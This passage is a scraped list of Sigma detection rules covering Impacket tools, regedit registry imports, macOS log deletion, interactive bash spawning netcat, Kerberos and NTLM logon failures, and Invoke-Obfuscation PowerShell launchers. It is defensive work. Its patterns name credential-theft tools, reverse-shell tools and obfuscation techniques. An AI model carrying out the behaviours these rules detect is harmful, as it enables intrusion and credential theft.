ParentCommandLine falsepositives: - Unknown level: high tags: - attack.execution - attack.t1047 - attack.lateral_movement - attack.t1021.003 
<li><a href="#">title:Impacket PsExec Execution id: 32d56ea1-417f-44ff-822b-882873f5f43b status: test description: Detects execution of Impacket's psexec.py. author: Bhabesh Raj references: - date: 2020/12/14 modified: 2022/01/07 logsource: product: windows service: security definition: 'The advanced audit policy setting "Object Access > Audit Detailed File Share" must be configured for Success/Failure' detection: selection1: EventID: 5145 ShareName: \\\*\IPC$ RelativeTargetName|contains: - 'RemCom_stdint' - 'RemCom_stdoutt' - 'RemCom_stderrt' condition: selection1 falsepositives: - Unknown level: high tags: - attack.lateral_movement - attack.t1021.002 
<li><a href="#">title:Impacket Tool Execution status: experimental id: 4627c6ae-6899-46e2-aa0c-6ebcb1becd19 description: Detects the execution of different compiled Windows binaries of the impacket toolset (based on names or part of their names - could lead to false positives) author: Florian Roth date: 2021/07/24 references: - tags: - attack.execution - attack.t1557.001 logsource: category: process_creation product: windows detection: selection: - Image|contains: - '\goldenPac' - '\karmaSMB' - '\kintercept' - '\ntlmrelayx' - '\rpcdump' - '\samrdump' - '\secretsdump' - '\smbexec' - '\smbrelayx' - '\wmiexec' - '\wmipersist' - Image|endswith: # - '\addcomputer_windows.exe' - '\atexec_windows.exe' - '\dcomexec_windows.exe' - '\dpapi_windows.exe' # - '\esentutl_windows.exe' - '\findDelegation_windows.exe' - '\GetADUsers_windows.exe' # - '\getArch_windows.exe' - '\GetNPUsers_windows.exe' - '\getPac_windows.exe' - '\getST_windows.exe' - '\getTGT_windows.exe' - '\GetUserSPNs_windows.exe' - '\ifmap_windows.exe' # - '\lookupsid_windows.exe' - '\mimikatz_windows.exe' # - '\mqtt_check_windows.exe' # - '\mssqlclient_windows.exe' # - '\mssqlinstance_windows.exe' - '\netview_windows.exe' - '\nmapAnswerMachine_windows.exe' #- '\ntfs-read_windows.exe' - '\opdump_windows.exe' # - '\ping6_windows.exe' # - '\ping_windows.exe' - '\psexec_windows.exe' # - '\raiseChild_windows.exe' - '\rdp_check_windows.exe' #- '\registry-read_windows.exe' #- '\reg_windows.exe' - '\sambaPipe_windows.exe' # - '\services_windows.exe' - '\smbclient_windows.exe' - '\smbserver_windows.exe' - '\sniffer_windows.exe' - '\sniff_windows.exe' - '\split_windows.exe' - '\ticketer_windows.exe' # - '\wmiquery_windows.exe' condition: selection falsepositives: - Legitimate use of the impacket tools level: high 
<li><a href="#">title:Imports Registry Key From a File id: 73bba97f-a82d-42ce-b315-9182e76c57b1 status: test description: Detects the import of the specified file to the registry with regedit.exe. author: Oddvar Moe, Sander Wiebing, oscd.community references: - - date: 2020/10/07 modified: 2022/02/15 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\regedit.exe' CommandLine|contains: - ' /i ' - ' /s ' - '.reg' filter: CommandLine|contains: - ' /e ' - ' /a ' - ' /c ' filter_2: CommandLine|re: ':[^ \\\\]' # to avoid intersection with ADS rule condition: selection and not filter and not filter_2 fields: - ParentImage - CommandLine falsepositives: - Legitimate import of keys - Evernote level: medium tags: - attack.t1112 - attack.defense_evasion 
<li><a href="#">title:Imports Registry Key From an ADS id: 0b80ade5-6997-4b1d-99a1-71701778ea61 status: test description: Detects the import of a alternate datastream to the registry with regedit.exe. author: Oddvar Moe, Sander Wiebing, oscd.community references: - - date: 2020/10/12 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\regedit.exe' CommandLine|contains: - ' /i ' - '.reg' selection_2: CommandLine|re: ':[^ \\\\]' filter: CommandLine|contains: - ' /e ' - ' /a ' - ' /c ' condition: selection and selection_2 and not filter fields: - ParentImage - CommandLine falsepositives: - Unknown level: high tags: - attack.t1112 - attack.defense_evasion 
<li><a href="#">title:Indicator Removal on Host - Clear Mac System Logs id: acf61bd8-d814-4272-81f0-a7a269aa69aa status: experimental description: Detects deletion of local audit logs author: remotephone, oscd.community date: 2020/10/11 modified: 2021/11/11 references: - logsource: product: macos category: process_creation detection: selection1: Image|endswith: '/rm' selection2: CommandLine|contains: '/var/log' selection3: CommandLine|contains|all: - '/Users/' - '/Library/Logs/' condition: selection1 and (selection2 or selection3) falsepositives: - Legitimate administration activities level: medium tags: - attack.defense_evasion - attack.t1070.002 
<li><a href="#">title:Indirect Command Execution By Program Compatibility Wizard id: b97cd4b1-30b8-4a9d-bd72-6293928d52bc status: test description: Detect indirect command execution via Program Compatibility Assistant pcwrun.exe author: A. Sungurov , oscd.community references: - - date: 2020/10/12 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\pcwrun.exe' condition: selection fields: - ComputerName - User - ParentCommandLine - CommandLine falsepositives: - Need to use extra processing with 'unique_count' / 'filter' to focus on outliers as opposed to commonly seen artifacts - Legit usage of scripts level: low tags: - attack.defense_evasion - attack.t1218 - attack.execution 
<li><a href="#">title:Indirect Command Execution id: fa47597e-90e9-41cd-ab72-c3b74cfb0d02 status: test description: Detect indirect command execution via Program Compatibility Assistant (pcalua.exe or forfiles.exe). author: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community references: - - date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: - '\pcalua.exe' - '\forfiles.exe' condition: selection fields: - ComputerName - User - ParentCommandLine - CommandLine falsepositives: - Need to use extra processing with 'unique_count' / 'filter' to focus on outliers as opposed to commonly seen artifacts. - Legitimate usage of scripts. level: low tags: - attack.defense_evasion - attack.t1202 
<li><a href="#">title:InfDefaultInstall.exe .inf Execution id: ce7cf472-6fcc-490a-9481-3786840b5d9b status: experimental author: frack113 date: 2021/07/13 description: Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file. references: - - logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'InfDefaultInstall.exe ' - '.inf' condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1218 
<li><a href="#">title:In-memory PowerShell id: 092bc4b9-3d1d-43b4-a6b4-8c8acd83522f related: - id: 867613fb-fa60-4497-a017-a82df74a172c type: obsoletes status: experimental description: Detects loading of essential DLL used by PowerShell, but not by the process powershell.exe. Detects meterpreter's "load powershell" extension. author: Tom Kern, oscd.community, Natalia Shornikova, Tim Shelton date: 2019/11/14 modified: 2022/04/21 references: - - tags: - attack.t1059.001 - attack.execution logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - '\System.Management.Automation.Dll' - '\System.Management.Automation.ni.Dll' filter: - Image: 'C:\Windows\System32\dsac.exe' - Image|endswith: - '\powershell.exe' - '\powershell_ise.exe' - '\WINDOWS\System32\sdiagnhost.exe' - '\mscorsvw.exe' # c:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsw.exe for instance - '\WINDOWS\System32\RemoteFXvGPUDisablement.exe' # on win10 - '\sqlps.exe' - '\wsmprovhost.exe' - '\winrshost.exe' - '\syncappvpublishingserver.exe' - '\runscripthelper.exe' - '\ServerManager.exe' - '\Microsoft SQL Server Management Studio *\Common*\IDE\Ssms.exe' - '\IDE\devenv.exe' - '\ServiceHub.VSDetouredHost.exe' - '\ServiceHub.SettingsHost.exe' - '\ServiceHub.Host.CLR.x86.exe' - '\Citrix\ConfigSync\ConfigSyncRun.exe' - Image|startswith: - 'C:\Program Files (x86)\Microsoft Visual Studio\' - 'C:\Program Files\Microsoft Visual Studio\' filter_nextron: Image|startswith: 'C:\Windows\Temp\asgard2-agent\' Image|endswith: - '\thor64.exe' - '\thor.exe' # User: 'NT AUTHORITY\SYSTEM' # if set, matches all powershell processes not launched by SYSTEM condition: selection and not 1 of filter* falsepositives: - Used by some .NET binaries, minimal on user workstation. - Used by Microsoft SQL Server Management Studio level: medium enrichment: - EN_0001_cache_sysmon_event_id_1_info # - EN_0003_enrich_other_sysmon_events_with_event_id_1_data # 
<li><a href="#">title:Install Root Certificate id: 78a80655-a51e-4669-bc6b-e9d206a462ee status: test description: Detects installed new certificate author: Ã–mer GÃ¼nal, oscd.community references: - date: 2020/10/05 modified: 2021/11/27 logsource: product: linux category: process_creation detection: selection: Image|endswith: - '/update-ca-certificates' - '/update-ca-trust' condition: selection falsepositives: - Legitimate administration activities level: low tags: - attack.defense_evasion - attack.t1553.004 
<li><a href="#">title:Installation of TeamViewer Desktop id: 9711de76-5d4f-4c50-a94f-21e4e8f8384d status: experimental description: TeamViewer_Desktop.exe is create during install author: frack113 references: - date: 2022/01/28 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: \TeamViewer_Desktop.exe condition: selection falsepositives: - Unknown level: medium tags: - attack.command_and_control - attack.t1219 
<li><a href="#">title:InstallerFileTakeOver LPE CVE-2021-41379 File Create Event id: 3be82d5d-09fe-4d6a-a275-0d40d234d324 status: experimental description: Detects signs of the exploitation of LPE CVE-2021-41379 that include an msiexec process that creates an elevation_service.exe file author: Florian Roth date: 2021/11/22 references: - - tags: - attack.privilege_escalation - attack.t1068 logsource: category: file_event product: windows detection: selection: Image|endswith: '\msiexec.exe' TargetFilename|startswith: 'C:\Program Files (x86)\Microsoft\Edge\Application' TargetFilename|endswith: '\elevation_service.exe' condition: selection fields: - ComputerName - TargetFilename falsepositives: - Unknown - Possibly some Microsoft Edge upgrades level: critical 
<li><a href="#">title:Interactive AT Job id: 60fc936d-2eb0-4543-8a13-911c750a1dfc status: test description: Detect an interactive AT job, which may be used as a form of privilege escalation. author: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community references: - - date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\at.exe' CommandLine|contains: 'interactive' condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Unlikely (at.exe deprecated as of Windows 8) level: high tags: - attack.privilege_escalation - attack.t1053.002 
<li><a href="#">title:Interactive Bash Suspicious Children id: ea3ecad2-db86-4a89-ad0b-132a10d2db55 status: experimental description: Detects suspicious interactive bash as a parent to rather uncommon child processes references: - Internal Research date: 2022/03/14 author: Florian Roth logsource: product: linux category: process_creation detection: selection: ParentCommandLine: 'bash -i' anomaly1: CommandLine|contains: - '-c import ' - 'base64' - 'pty.spawn' anomaly2: Image|endswith: - 'whoami' - 'iptables' - '/ncat' - '/nc' - '/netcat' condition: selection and 1 of anomaly* falsepositives: - Legitimate software that uses these patterns level: medium 
<li><a href="#">title:Interactive Logon to Server Systems id: 3ff152b2-1388-4984-9cd9-a323323fdadf status: test description: Detects interactive console logons to Server Systems author: Florian Roth date: 2017/03/17 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: - 528 - 529 - 4624 - 4625 LogonType: 2 ComputerName: - '%ServerSystems%' - '%DomainControllers%' filter: LogonProcessName: Advapi ComputerName: '%Workstations%' condition: selection and not filter falsepositives: - Administrative activity via KVM or ILO board level: medium tags: - attack.lateral_movement - attack.t1078 
<li><a href="#">title:Internet Explorer Autorun Keys Modification id: a80f662f-022f-4429-9b8c-b1a41aaa6688 related: - id: 17f878b8-9968-4578-b814-c4217fc5768c type: derived status: experimental description: Detects modification of autostart extensibility point (ASEP) in registry. author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split) references: - - - # a list with registry keys date: 2019/10/25 modified: 2022/03/26 logsource: category: registry_set product: windows detection: ie: EventType: SetValue TargetObject|contains: - '\Software\Wow6432Node\Microsoft\Internet Explorer' - '\Software\Microsoft\Internet Explorer' ie_details: TargetObject|contains: - '\Toolbar' - '\Extensions' - '\Explorer Bars' filter_empty: Details: '(Empty)' filter_extensions: TargetObject|contains: - '\Extensions\{2670000A-7350-4f3c-8081-5663EE0C6C49}' - '\Extensions\{31D09BA0-12F5-4CCE-BE8A-2923E76605DA}' - '\Extensions\{789FE86F-6FC4-46A1-9849-EDE0DB0C95CA}' - '\Extensions\{A95fe080-8f5d-11d2-a20b-00aa003c157a}' filter_toolbar: TargetObject|endswith: - '\Toolbar\ShellBrowser\ITBar7Layout' - '\Toolbar\ShowDiscussionButton' - '\Toolbar\Locked' condition: ie and ie_details and not 1 of filter_* fields: - SecurityID - ObjectName - OldValueType - NewValueType falsepositives: - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason - Legitimate administrator sets up autorun keys for legitimate reason level: medium tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:Invalid Users Failing To Authenticate From Single Source Using NTLM id: 56d62ef8-3462-4890-9859-7b41e541f8d5 description: Detects failed logins with multiple invalid domain accounts from a single source system using the NTLM protocol. status: experimental author: Mauricio Velazco date: 2021/06/01 modified: 2021/07/07 references: - tags: - attack.t1110.003 - attack.initial_access - attack.privilege_escalation logsource: product: windows service: security detection: selection1: EventID: 4776 Status: '*0xC0000064' # The username you typed does not exist. Bad username. filter: TargetUserName: '*$' timeframe: 24h condition: - selection1 and not filter falsepositives: - Terminal servers - Jump servers - Other multiuser systems like Citrix server farms - Workstations with frequently changing users level: medium 
<li><a href="#">title:Invalid Users Failing To Authenticate From Source Using Kerberos id: bc93dfe6-8242-411e-a2dd-d16fa0cc8564 description: Detects failed logins with multiple invalid domain accounts from a single source system using the Kerberos protocol. status: experimental author: Mauricio Velazco, frack113 date: 2021/06/01 modified: 2021/07/06 references: - tags: - attack.t1110.003 - attack.initial_access - attack.privilege_escalation logsource: product: windows service: security detection: selection: EventID: 4768 Status: '0x6' filter_computer: TargetUserName|endswith: '$' timeframe: 24h condition: - selection and not filter_computer falsepositives: - Vulnerability scanners - Misconfigured systems - Remote administration tools - VPN terminators - Multiuser systems like Citrix server farms level: medium 
<li><a href="#">title:Invocation of Active Directory Diagnostic Tool (ntdsutil.exe) id: 2afafd61-6aae-4df4-baed-139fa1f4c345 status: test description: Detects execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT) author: Thomas Patzke references: - date: 2019/01/16 modified: 2022/03/11 # increased level logsource: category: process_creation product: windows detection: selection: Image|endswith: '\ntdsutil.exe' condition: selection falsepositives: - NTDS maintenance level: medium tags: - attack.credential_access - attack.t1003.003 
<li><a href="#">title:Invoke-Obfuscation CLIP+ Launcher id: 4edf51e1-cb83-4e1a-bc39-800e396068e3 related: - id: f7385ee2-0e0c-11eb-adc1-0242ac120002 type: derived description: Detects Obfuscated use of Clip.exe to execute PowerShell status: experimental author: Jonathan Cheong, oscd.community date: 2020/10/13 modified: 2022/02/24 references: - #(Task 26) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: security detection: selection: Provider_Name: 'Microsoft-Windows-Security-Auditing' EventID: 4697 ServiceFileName|contains|all: - 'cmd' - '&&' - 'clipboard]::' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation CLIP+ Launcher id: 73e67340-0d25-11eb-adc1-0242ac120002 description: Detects Obfuscated use of Clip.exe to execute PowerShell status: experimental author: Jonathan Cheong, oscd.community date: 2020/10/13 modified: 2021/10/16 references: - #(Task 26) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_4104: ScriptBlockText|re: '.*cmd.{0,5}(?:\/c|\/r).+clip(?:\.exe)?.{0,4}&&.+clipboard]::\(\s\\\"\{\d\}.+\-f.+\"' condition: selection_4104 falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation CLIP+ Launcher id: a136cde0-61ad-4a61-9b82-8dc490e60dd2 related: - id: 73e67340-0d25-11eb-adc1-0242ac120002 type: derived description: Detects Obfuscated use of Clip.exe to execute PowerShell status: experimental author: Jonathan Cheong, oscd.community date: 2020/10/13 modified: 2021/10/16 references: - #(Task 26) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection_4103: Payload|re: '.*cmd.{0,5}(?:\/c|\/r).+clip(?:\.exe)?.{0,4}&&.+clipboard]::\(\s\\\"\{\d\}.+\-f.+\"' condition: selection_4103 falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation CLIP+ Launcher id: b222df08-0e07-11eb-adc1-0242ac120002 status: test description: Detects Obfuscated use of Clip.exe to execute PowerShell author: Jonathan Cheong, oscd.community references: - #(Task 26) date: 2020/10/13 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|re: '.*cmd.{0,5}(?:\/c|\/r).+clip(?:\.exe)?.{0,4}&&.+clipboard]::\(\s\\\"\{\d\}.+\-f.+\"' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation CLIP+ Launcher id: f7385ee2-0e0c-11eb-adc1-0242ac120002 description: Detects Obfuscated use of Clip.exe to execute PowerShell status: experimental author: Jonathan Cheong, oscd.community date: 2020/10/13 modified: 2022/02/03 references: - #(Task 26) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 ImagePath|contains|all: - 'cmd' - 'clip' - 'clipboard]::' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation COMPRESS OBFUSCATION id: 175997c5-803c-4b08-8bb0-70b099f47595 description: Detects Obfuscated Powershell via COMPRESS OBFUSCATION status: experimental author: Timur Zinniatullin, oscd.community date: 2020/10/18 modified: 2022/03/06 references: - #(Task 19) falsepositives: - Unknown level: medium logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 ImagePath|contains|all: - 'new-object' - 'text.encoding]::ascii' - 'readtoend' ImagePath|contains: - ':system.io.compression.deflatestream' - 'system.io.streamreader' condition: selection tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation COMPRESS OBFUSCATION id: 20e5497e-331c-4cd5-8d36-935f6e2a9a07 description: Detects Obfuscated Powershell via COMPRESS OBFUSCATION status: experimental author: Timur Zinniatullin, oscd.community date: 2020/10/18 modified: 2022/03/08 references: - #(Task 19) logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_4104: ScriptBlockText|contains|all: - 'new-object' - 'text.encoding]::ascii' ScriptBlockText|contains: - 'system.io.compression.deflatestream' - 'system.io.streamreader' ScriptBlockText|endswith: 'readtoend' condition: selection_4104 falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation COMPRESS OBFUSCATION id: 7034cbbb-cc55-4dc2-8dad-36c0b942e8f1 related: - id: 20e5497e-331c-4cd5-8d36-935f6e2a9a07 type: derived description: Detects Obfuscated Powershell via COMPRESS OBFUSCATION status: experimental author: Timur Zinniatullin, oscd.community date: 2020/10/18 modified: 2021/10/16 references: - #(Task 19) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection_4103: Payload|contains|all: - 'new-object' - 'text.encoding]::ascii' Payload|contains: - 'system.io.compression.deflatestream' - 'system.io.streamreader' Payload|endswith: 'readtoend' condition: selection_4103 falsepositives: - Unknown level: medium 
<li><a href="#">title:Invoke-Obfuscation COMPRESS OBFUSCATION id: 7a922f1b-2635-4d6c-91ef-af228b198ad3 related: - id: 175997c5-803c-4b08-8bb0-70b099f47595 type: derived description: Detects Obfuscated Powershell via COMPRESS OBFUSCATION status: experimental author: Timur Zinniatullin, oscd.community date: 2020/10/18 modified: 2022/02/03 references: - #(Task 19) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: security detection: selection: EventID: 4697 ServiceFileName|contains|all: - 'new-object' - 'text.encoding]::ascii' - 'readtoend' selection2: ServiceFileName|contains: - 'system.io.compression.deflatestream' - 'system.io.streamreader' condition: all of selection* falsepositives: - Unknown level: medium 
<li><a href="#">title:Invoke-Obfuscation COMPRESS OBFUSCATION id: 7eedcc9d-9fdb-4d94-9c54-474e8affc0c7 status: test description: Detects Obfuscated Powershell via COMPRESS OBFUSCATION author: Timur Zinniatullin, oscd.community references: - #(Task 19) date: 2020/10/18 modified: 2022/03/07 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'new-object' - 'text.encoding]::ascii' CommandLine|contains: - 'system.io.compression.deflatestream' - 'system.io.streamreader' CommandLine|endswith: 'readtoend' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation Obfuscated IEX Invocation id: 1b9dc62e-6e9e-42a3-8990-94d7a10007f7 description: Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \u2014 references: - status: experimental author: 'Daniel Bohannon (@Mandiant/@FireEye), oscd.community' date: 2019/11/08 modified: 2022/01/27 tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_iex: - ScriptBlockText|re: '\$PSHome\[\s*\d{1,3}\s*\]\s*\+\s*\$PSHome\[' - ScriptBlockText|re: '\$ShellId\[\s*\d{1,3}\s*\]\s*\+\s*\$ShellId\[' - ScriptBlockText|re: '\$env:Public\[\s*\d{1,3}\s*\]\s*\+\s*\$env:Public\[' - ScriptBlockText|re: '\$env:ComSpec\[(\s*\d{1,3}\s*,){2}' - ScriptBlockText|re: '\\\\*mdr\\\\*\W\s*\)\.Name' - ScriptBlockText|re: '\$VerbosePreference\.ToString\(' condition: selection_iex falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation Obfuscated IEX Invocation id: 2f211361-7dce-442d-b78a-c04039677378 related: - id: 1b9dc62e-6e9e-42a3-8990-94d7a10007f7 type: derived description: Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \u2014 references: - status: experimental author: Daniel Bohannon (@Mandiant/@FireEye), oscd.community date: 2019/11/08 modified: 2021/10/16 tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection_payload: - Payload|re: '\$PSHome\[\s*\d{1,3}\s*\]\s*\+\s*\$PSHome\[' - Payload|re: '\$ShellId\[\s*\d{1,3}\s*\]\s*\+\s*\$ShellId\[' - Payload|re: '\$env:Public\[\s*\d{1,3}\s*\]\s*\+\s*\$env:Public\[' - Payload|re: '\$env:ComSpec\[(\s*\d{1,3}\s*,){2}' - Payload|re: '\\\\*mdr\\\\*\W\s*\)\.Name' - Payload|re: '\$VerbosePreference\.ToString\(' - Payload|re: '\String\]\s*\$VerbosePreference' condition: selection_payload falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation Obfuscated IEX Invocation id: 4bf943c6-5146-4273-98dd-e958fd1e3abf status: test description: Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block references: - author: 'Daniel Bohannon (@Mandiant/@FireEye), oscd.community' date: 2019/11/08 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: - CommandLine|re: '\$PSHome\[\s*\d{1,3}\s*\]\s*\+\s*\$PSHome\[' - CommandLine|re: '\$ShellId\[\s*\d{1,3}\s*\]\s*\+\s*\$ShellId\[' - CommandLine|re: '\$env:Public\[\s*\d{1,3}\s*\]\s*\+\s*\$env:Public\[' - CommandLine|re: '\$env:ComSpec\[(\s*\d{1,3}\s*,){2}' - CommandLine|re: '\\\\*mdr\\\\*\W\s*\)\.Name' - CommandLine|re: '\$VerbosePreference\.ToString\(' - CommandLine|re: '\\\\String\]\s*\$VerbosePreference' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation Obfuscated IEX Invocation id: 51aa9387-1c53-4153-91cc-d73c59ae1ca9 description: 'Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \u2014' references: - status: experimental author: Daniel Bohannon (@Mandiant/@FireEye), oscd.community date: 2019/11/08 modified: 2021/09/16 tags: - attack.defense_evasion - attack.t1027 logsource: product: windows service: system detection: selection: EventID: 7045 selection_1: - ImagePath|re: '\$PSHome\[\s*\d{1,3}\s*\]\s*\+\s*\$PSHome\[' - ImagePath|re: '\$ShellId\[\s*\d{1,3}\s*\]\s*\+\s*\$ShellId\[' - ImagePath|re: '\$env:Public\[\s*\d{1,3}\s*\]\s*\+\s*\$env:Public\[' - ImagePath|re: '\$env:ComSpec\[(\s*\d{1,3}\s*,){2}' - ImagePath|re: '\\*mdr\*\W\s*\)\.Name' - ImagePath|re: '\$VerbosePreference\.ToString\(' - ImagePath|re: '\String\]\s*\$VerbosePreference' condition: selection and selection_1 falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation Obfuscated IEX Invocation id: fd0f5778-d3cb-4c9a-9695-66759d04702a related: - id: 51aa9387-1c53-4153-91cc-d73c59ae1ca9 type: derived description: 'Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the code block linked in the references' references: - status: experimental author: Daniel Bohannon (@Mandiant/@FireEye), oscd.community date: 2019/11/08 modified: 2021/09/16 tags: - attack.defense_evasion - attack.t1027 logsource: product: windows service: security detection: selection: EventID: 4697 selection_1: - ServiceFileName|re: '\$PSHome\[\s*\d{1,3}\s*\]\s*\+\s*\$PSHome\[' - ServiceFileName|re: '\$ShellId\[\s*\d{1,3}\s*\]\s*\+\s*\$ShellId\[' - ServiceFileName|re: '\$env:Public\[\s*\d{1,3}\s*\]\s*\+\s*\$env:Public\[' - ServiceFileName|re: '\$env:ComSpec\[(\s*\d{1,3}\s*,){2}' - ServiceFileName|re: '\\*mdr\*\W\s*\)\.Name' - ServiceFileName|re: '\$VerbosePreference\.ToString\(' - ServiceFileName|re: '\String\]\s*\$VerbosePreference' condition: selection and selection_1 falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation RUNDLL LAUNCHER id: 056a7ee1-4853-4e67-86a0-3fd9ceed7555 status: test description: Detects Obfuscated Powershell via RUNDLL LAUNCHER author: Timur Zinniatullin, oscd.community references: - #(Task 23) date: 2020/10/18 modified: 2022/03/07 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'rundll32.exe' - 'shell32.dll' - 'shellexec_rundll' - 'powershell' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation RUNDLL LAUNCHER id: 11b52f18-aaec-4d60-9143-5dd8cc4706b9 description: Detects Obfuscated Powershell via RUNDLL LAUNCHER status: experimental author: Timur Zinniatullin, oscd.community date: 2020/10/18 modified: 2022/03/07 references: - #(Task 23) logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 ImagePath|contains|all: - 'rundll32.exe' - 'shell32.dll' - 'shellexec_rundll' - 'powershell' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation RUNDLL LAUNCHER id: a23791fe-8846-485a-b16b-ca691e1b03d4 related: - id: e6cb92b4-b470-4eb8-8a9d-d63e8583aae0 type: derived description: Detects Obfuscated Powershell via RUNDLL LAUNCHER status: experimental author: Timur Zinniatullin, oscd.community date: 2020/10/18 modified: 2022/03/08 references: - #(Task 23) logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection_4103: Payload|contains|all: - 'rundll32.exe' - 'shell32.dll' - 'shellexec_rundll' - 'powershell' condition: selection_4103 falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation RUNDLL LAUNCHER id: e6cb92b4-b470-4eb8-8a9d-d63e8583aae0 description: Detects Obfuscated Powershell via RUNDLL LAUNCHER status: experimental author: Timur Zinniatullin, oscd.community date: 2020/10/18 modified: 2022/03/08 references: - #(Task 23) logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_4104: ScriptBlockText|contains|all: - 'rundll32.exe' - 'shell32.dll' - 'shellexec_rundll' - 'powershell' condition: selection_4104 falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation RUNDLL LAUNCHER id: f241cf1b-3a6b-4e1a-b4f9-133c00dd95ca related: - id: 11b52f18-aaec-4d60-9143-5dd8cc4706b9 type: derived description: Detects Obfuscated Powershell via RUNDLL LAUNCHER status: experimental author: Timur Zinniatullin, oscd.community date: 2020/10/18 modified: 2022/03/06 references: - #(Task 23) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: security detection: selection: EventID: 4697 ServiceFileName|contains|all: - 'rundll32.exe' - 'shell32.dll' - 'shellexec_rundll' - 'powershell' condition: selection falsepositives: - Unknown level: medium 
